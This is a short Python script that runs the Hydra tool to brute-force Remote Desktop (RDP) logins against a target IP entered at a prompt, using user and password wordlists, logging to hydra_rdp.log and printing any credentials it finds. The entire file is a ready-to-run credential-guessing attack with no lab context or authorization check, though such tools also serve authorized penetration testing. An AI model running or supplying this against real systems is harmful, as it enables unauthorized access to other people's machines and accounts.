#!/usr/bin/env python3
import subprocess
import os

def brute_force_rdp(target_ip, users_file='users.txt', passwords_file='passwords.txt', output_file='hydra_rdp.log'):
    print(f"Starting brute force attack with Hydra on {target_ip} using RDP...")

    if not os.path.exists(users_file):
        print(f"User file '{users_file}' not found.")
        return
    if not os.path.exists(passwords_file):
        print(f"Password file '{passwords_file}' not found.")
        return

    command = [
        'hydra',
        '-L', users_file,
        '-P', passwords_file,
        '-t', '8',
        target_ip,
        'rdp',
        '-V',
        '-o', output_file
    ]

    try:
        subprocess.run(command, check=True)
        print(f"Brute force attack finished. Results saved to '{output_file}'.\n")

        # Display the results if any
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                result = f.read()
                print("Hydra Results:")
                print(result if result.strip() else "No valid credentials found.")

    except subprocess.CalledProcessError as e:
        print(f"Error running Hydra: {e}")
    except FileNotFoundError:
        print("Hydra is not installed or not found in the system PATH.")

# Main execution
if __name__ == '__main__':
    target = input("Enter the target IP address: ")
    brute_force_rdp(target)
